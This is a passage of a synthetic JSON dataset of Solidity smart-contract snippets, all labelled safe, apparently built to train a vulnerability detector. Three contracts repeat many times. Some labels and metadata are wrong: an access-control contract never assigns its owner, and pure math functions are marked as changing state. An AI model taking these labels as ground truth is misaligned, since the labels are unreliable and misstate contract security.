      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 32",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 33",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 34",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 35",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 36",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 37",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 38",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 39",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 40",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 41",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 42",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 43",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 44",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 45",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 46",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 47",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 48",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 49",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 50",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 51",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 52",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 53",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 54",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 55",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 56",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 57",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 58",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 59",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 60",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 61",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
